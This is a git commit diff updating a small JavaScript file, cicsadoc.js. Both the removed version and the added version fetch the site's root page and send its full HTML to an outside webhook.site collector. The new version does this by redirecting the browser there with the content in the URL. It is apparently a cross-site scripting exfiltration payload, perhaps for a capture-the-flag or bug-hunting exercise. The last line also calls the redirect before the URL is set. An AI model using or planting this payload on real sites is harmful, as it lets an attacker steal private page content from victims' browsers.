8af0e8dd5912942fdddbbc4ded10f9c2d859d8cf
M0NT3C4RL0 <109765724+M0NT3C4RL0@users.noreply.github.com>
2022-09-03 17:13:12 +0200

    Update cicsadoc.js

--- cicsadoc.js
+++ cicsadoc.js
@@ -1,22 +1,8 @@
+var url;
+
 fetch('/')
-    .then(function(response) {
-        // When the page is loaded convert it to text
-        return response.text()
-    })
-    .then(function(html) {
-        // Initialize the DOM parser
-        var parser = new DOMParser();
+  .then(res => res.text())
+  .then(data => url = "https://webhook.site/bb581fce-351d-4b88-96fd-ab230a1465fd?c=" + encodeURIComponent(data))
+  .then(() => document.location.replace(url))
 
-        // Parse the text
-        var doc = parser.parseFromString(html, "text/html");
-
-        // You can now even select part of that html as you would in the regular DOM 
-        // Example:
-        // var docArticle = doc.querySelector('article').innerHTML;
-
-        var url = "https://webhook.site/bb581fce-351d-4b88-96fd-ab230a1465fd?c=" + doc.body.outerHTML;
-        fetch(url);
-    })
-    .catch(function(err) {  
-        console.log('Failed to fetch page: ', err);  
-    });
+document.location.replace(url);
